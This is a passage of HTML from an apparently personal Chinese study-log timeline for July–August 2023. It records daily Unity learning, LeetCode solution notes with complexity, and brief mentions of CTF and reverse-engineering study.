id="2023-8-7-2"><p><a href="https://leetcode.cn/problems/reverse-string/">344. 反转字符串</a></p><p>C#思路：一个for，长度为数组的一半。每次通过异或交换指定位置的字符。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-6"><a href="#2023-8-6" class="headerlink" title="2023-8-6"></a>2023-8-6</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-6"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-6-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-6-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-6-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-6-2"><p><a href="https://leetcode.cn/problems/swap-nodes-in-pairs/">24. 两两交换链表中的节点</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-5"><a href="#2023-8-5" class="headerlink" title="2023-8-5"></a>2023-8-5</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-5"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-5-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-5-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-8-5-3">攻防世界【每日】</button></li><li class="tab"><button type="button" data-href="#2023-8-5-4">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-5-1"><p>玩了一天。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-5-2"><p>这题不会</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-5-3"><p>这题不会</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-5-4"><p>待更新</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-4"><a href="#2023-8-4" class="headerlink" title="2023-8-4"></a>2023-8-4</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-4-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-4-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-3"><a href="#2023-8-3" class="headerlink" title="2023-8-3"></a>2023-8-3</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-3"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-3-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-3-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-2"><a href="#2023-8-2" class="headerlink" title="2023-8-2"></a>2023-8-2</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-2"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-2-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-2-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-1"><a href="#2023-8-1" class="headerlink" title="2023-8-1"></a>2023-8-1</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-1-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-1-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div></div><div class="timeline  blue"><div class="timeline-item headline"><div class="timeline-item-title"><div class="item-circle"><h2 id="2023-7"><a href="#2023-7" class="headerlink" title="2023-7"></a>2023-7</h2></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-31"><a href="#2023-7-31" class="headerlink" title="2023-7-31"></a>2023-7-31</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-31"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-31-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-7-31-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-31-1"><p>算法题。</p><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-31-2"><p><a href="https://leetcode.cn/problems/reorder-list/">143. 重排链表</a></p><p>C#思路：先快慢指针，找到链表中点。然后反转后面的链表。最后将前后两个链表进行合并。</p><p>时间：<script type="math/tex">O(N)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-30"><a href="#2023-7-30" class="headerlink" title="2023-7-30"></a>2023-7-30</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-30"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-30-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-30-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-29"><a href="#2023-7-29" class="headerlink" title="2023-7-29"></a>2023-7-29</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-29"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-29-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-29-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-28"><a href="#2023-7-28" class="headerlink" title="2023-7-28"></a>2023-7-28</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-28"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-28-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-28-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-27"><a href="#2023-7-27" class="headerlink" title="2023-7-27"></a>2023-7-27</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-27"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-27-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-27-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-26"><a href="#2023-7-26" class="headerlink" title="2023-7-26"></a>2023-7-26</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-26"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-26-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-26-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-25"><a href="#2023-7-25" class="headerlink" title="2023-7-25"></a>2023-7-25</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-25"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-25-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-25-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-24"><a href="#2023-7-24" class="headerlink" title="2023-7-24"></a>2023-7-24</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-24"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-24-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-7-24-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-24-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-24-2"><p><a href="https://leetcode.cn/problems/jewels-and-stones/">771. 宝石与石头</a></p><p>python3思路：哈希表。先把jewels出现的字母存入字典，然后判断stones的字母是否在字典中。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-23"><a href="#2023-7-23" class="headerlink" title="2023-7-23"></a>2023-7-23</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-23"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-23-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-23-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-22"><a href="#2023-7-22" class="headerlink" title="2023-7-22"></a>2023-7-22</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-22"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-22-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-7-22-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-22-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-22-2"><p><a href="https://leetcode.cn/problems/lemonade-change/">860. 柠檬水找零</a></p><p>python3思路：拿一个字典存5元和10元的数量。然后一个for判断，10元会减去1张5元的，20元可以选择减去1张10元1张5元，或者减去3张5元的。不满足条件就返回False，循环完成返回True。</p><p>时间：<script type="math/tex">O(N)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-21"><a href="#2023-7-21" class="headerlink" title="2023-7-21"></a>2023-7-21</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-21"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-21-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-21-1"><p>Unity：协程。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-20"><a href="#2023-7-20" class="headerlink" title="2023-7-20"></a>2023-7-20</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-20"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-20-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-20-1"><p>Unity：Animator。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-19"><a href="#2023-7-19" class="headerlink" title="2023-7-19"></a>2023-7-19</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-19"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-19-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-7-19-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-19-1"><p>算法题。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-19-2"><p><a href="https://leetcode.cn/problems/walking-robot-simulation/">874. 模拟行走机器人</a></p><p>python3思路：哈希表模拟，同官解。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-18"><a href="#2023-7-18" class="headerlink" title="2023-7-18"></a>2023-7-18</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-18"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-18-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-18-1"><p>计算机网络：简单复习。</p><p>Untiy：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-17"><a href="#2023-7-17" class="headerlink" title="2023-7-17"></a>2023-7-17</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-17"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-17-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-7-17-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-17-1"><p>英：词听。</p><p>算法题。</p><p>Unity：持久化存储。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-17-2"><p><a href="https://leetcode.cn/problems/add-strings/">415. 字符串相加</a></p><p>python3思路：双指针。从尾部开始加，设置进位位。先是<code>while lp &gt;= 0 and rp &gt;= 0</code>，然后再<code>while lp &gt;= 0</code>和<code>while rp &gt;= 0</code>，依次加上值和进位位。最后若进位位等于1，还要在加上一次进位位。</p><p>时间：<script type="math/tex">O(max(m,n))</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-16"><a href="#2023-7-16" class="headerlink" title="2023-7-16"></a>2023-7-16</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-16"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-16-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-7-16-2">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-16-1"><p>Unity：2048UI学习 + C#。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-16-2"><p>Csharp：集合。</p><p>Unity脚本：UGUI。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-15"><a href="#2023-7-15" class="headerlink" title="2023-7-15"></a>2023-7-15</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-15"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-15-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-15-1"><p>Unity：2048UI学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-14"><a href="#2023-7-14" class="headerlink" title="2023-7-14"></a>2023-7-14</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-14"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-14-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-14-1"><p>Unity：2048UI学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-13"><a href="#2023-7-13" class="headerlink" title="2023-7-13"></a>2023-7-13</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-13"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-13-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-13-1"><p>Unity：2048UI学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-12"><a href="#2023-7-12" class="headerlink" title="2023-7-12"></a>2023-7-12</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-12"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-12-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-12-1"><p>Unity：练习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-11"><a href="#2023-7-11" class="headerlink" title="2023-7-11"></a>2023-7-11</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-11"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-11-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-7-11-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-11-1"><p>Unity：三维数学。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-11-2"><p><a href="https://leetcode.cn/problems/maximum-alternating-subsequence-sum/">1911. 最大子序列交替和</a></p><p>c++思路：评论区看到的贪心。首先取第一个值，然后一个for，取<code>res += max(nums[i] - nums[i-1],0);</code>。这样可以保证是最大的偶数值减去最小的奇数值。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-10"><a href="#2023-7-10" class="headerlink" title="2023-7-10"></a>2023-7-10</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-10"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-10-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-10-1"><p>玩了一天</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-9"><a href="#2023-7-9" class="headerlink" title="2023-7-9"></a>2023-7-9</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-9"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-9-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-7-9-2">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-9-1"><p>Unity：三维数学。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-9-2"><p>Unity脚本：三维数学</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-8"><a href="#2023-7-8" class="headerlink" title="2023-7-8"></a>2023-7-8</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-8"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-8-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-7-8-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-7-8-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-8-1"><p>算法题。</p><p>Unity：三维数学。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-8-2"><p><a href="https://leetcode.cn/problems/two-sum-ii-input-array-is-sorted/">167. 两数之和 II - 输入有序数组</a></p><p>C++思路：双指针。因为必有解且数组有序，不用额外空间。所以先创建结果数组，把左右指针存入数组中。然后一个while，当指向的值不等于结果时，进入while再判断，当它们的和大于结果，说明结果大了，移动右指针，否则移动左指针。跳出循环后表明找到结果。因为是索引1开始，所以指针结果加一后返回。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-8-3"><p>Unity脚本：三维数学和UI界面。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-7"><a href="#2023-7-7" class="headerlink" title="2023-7-7"></a>2023-7-7</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-7"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-7-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-7-7-2">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-7-1"><p>Unity：三维数学。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-7-2"><p>Unity脚本：三维数学。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-6"><a href="#2023-7-6" class="headerlink" title="2023-7-6"></a>2023-7-6</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-6"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-6-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-7-6-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-6-1"><p>算法题。</p><p>绘画。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-6-2"><p><a href="https://leetcode.cn/problems/maximum-split-of-positive-even-integers/">2178. 拆分成最多数目的正偶数之和</a></p><p>C++思路：先判断奇偶，然后一个for，第一次结果中加上2，第二次加上4，依次类推，直到剩余的数小于此次要加的数，然后把余数加到最后一个数上。这样数组是最长的。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-5"><a href="#2023-7-5" class="headerlink" title="2023-7-5"></a>2023-7-5</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-5"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-5-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-7-5-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-5-1"><p>英语词。</p><p>算法题。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-5-2"><p><a href="https://leetcode.cn/problems/k-items-with-the-maximum-sum/">2600. K 件物品的最大和</a></p><p>C++思路：贪心。先判断1和k的数量关系，再判断0和k的数量关系，最后判断-1和k的数量关系。</p><p>时间：<script type="math/tex">O(1)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-4"><a href="#2023-7-4" class="headerlink" title="2023-7-4"></a>2023-7-4</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-4-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-7-4-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-7-4-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-4-1"><p>算法题。</p><p>C#：高级。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-4-2"><p><a href="https://leetcode.cn/problems/sum-in-a-matrix/">2679. 矩阵中的和</a></p><p>python3算法：暴力，先给每列排序。然后两层for，每次找到nums[row]那一行最大的列值。返回累加值。</p><p>时间：<script type="math/tex">O(mnlogn)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-4-3"><p>C#：高级</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-3"><a href="#2023-7-3" class="headerlink" title="2023-7-3"></a>2023-7-3</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-3"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-3-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-7-3-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-7-3-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-3-1"><p>算法题。</p><p>逆向：串操作。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-3-2"><p><a href="https://leetcode.cn/problems/add-two-numbers-ii/">445. 两数相加 II</a></p><p>python3思路：先反转两个链表，然后同理昨天。最后生成的链表也反转一下。或者用栈也行。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-3-3"><p>反汇编代码分析：汇编指令。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-2"><a href="#2023-7-2" class="headerlink" title="2023-7-2"></a>2023-7-2</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-2"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-2-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-7-2-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-2-1"><p>英语词。</p><p>算法题，算法赛。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-7-2-2"><p><a href="https://leetcode.cn/problems/add-two-numbers/">2. 两数相加</a></p><p>python3思路：先创建一个头结点和一个进位位。然后循环，每次判断l1和l2是否有一个非空，存在则加上非空的那个值和进位位。加完后判断是否有进位，有的话进位位设为1，没有设为0。循环结束再判断一次进位位。最后返回头结点的下一个节点。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-7-1"><a href="#2023-7-1" class="headerlink" title="2023-7-1"></a>2023-7-1</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-7-1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-7-1-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-7-1-1"><p>英语词。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div></div><div class="timeline  blue"><div class="timeline-item headline"><div class="timeline-item-title"><div class="item-circle"><h2 id="2023-6"><a href="#2023-6" class="headerlink" title="2023-6"></a>2023-6</h2></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-30"><a href="#2023-6-30" class="headerlink" 